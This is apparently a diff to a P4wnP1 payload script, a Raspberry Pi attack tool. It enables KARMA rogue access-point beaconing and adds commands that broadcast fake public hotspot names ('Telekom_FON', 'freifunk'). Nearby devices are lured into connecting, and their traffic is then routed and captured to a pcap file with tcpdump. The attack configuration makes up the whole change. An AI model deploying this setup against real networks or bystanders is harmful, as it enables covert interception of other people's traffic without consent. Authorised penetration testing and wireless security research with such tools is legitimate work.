@@ -98,6 +98,10 @@
 # F.e. P4wnP1's SSH server is reachable for every connected WiFi station and the device providing the bluetooth
 # upstream - DON'T USE IT IN PRODUCTION !
 #
+# Update: To demo the firmware capabilities, two additional custom SSID are added and
+#         KARMA beaconing enabled (KARMA_LOUD). The custom SSIDs are removed if no association request
+#         is received after sending 1800 beacons (about 3 minutes)
+#
 #
 # hostapd output is logged to /tmp/hostapd.log
 #
@@ -147,8 +151,7 @@ WIFI_NEXMON_BRING_UP_MONITOR_FIRST=true	# we force monitor interface creation be
 
 
 WIFI_ACCESSPOINT_KARMA=true # enables Karma attack with modified nexmon firmware
-WIFI_ACCESSPOINT_KARMA_LOUD=0 # NO EFFECT IN CURRENT FIRMWARE; Send back corresponding beacons only to clients which have sent a probe request (no broadcast of beacons)
-
+WIFI_ACCESSPOINT_KARMA_LOUD=true # beacons for SSIDs spotted in probe requests are broadcasted (maximum 20)
 									
 AUTOSSH_ENABLED=false # disable AutoSSH reachback, we have no upstream by default
 
@@ -182,6 +185,15 @@ function onAccessPointUp()
 
 	led_blink 3
 	
+	##### DEMO of KARMA firmware configuration tool 'karmatool.py' (works on running AP)
+
+	# add two custom SSIDs to demo the capbilities of the new config tool (remove them if not needed) and
+	$wdir/nexmon/karmatool.py --addssid="Telekom_FON" --addssid="freifunk"
+	# enable beaconing for custom SSIDs
+	$wdir/nexmon/karmatool.py -s 1
+	# Remove custom SSIDs if no association request is seen after sending 1800 beacons (aboout 3 minutes)
+	$wdir/nexmon/karmatool.py --autoremcustom=1800
+		
 
 	# wait till bnep0 (which is only up if we are connected to a bluetooth Network Access Point (NAP)) received an IP
 	echo "Waiting till the bnep0 interface is up and got an IP"
@@ -203,6 +215,8 @@ function onAccessPointUp()
 	sudo iptables -t nat -A POSTROUTING -o bnep0 -j MASQUERADE
 
 	led_blink 5
+
+	
 	
 	# start dumping traffic on wlan0 to pcap !!Caution, there's no sync when P4wnP1 looses power - file could get corrupted!!
 	NOW=$(date +"%F_%H_%M"); tcpdump -i wlan0 -w $wdir/collected/karma_dump_$NOW.pcap
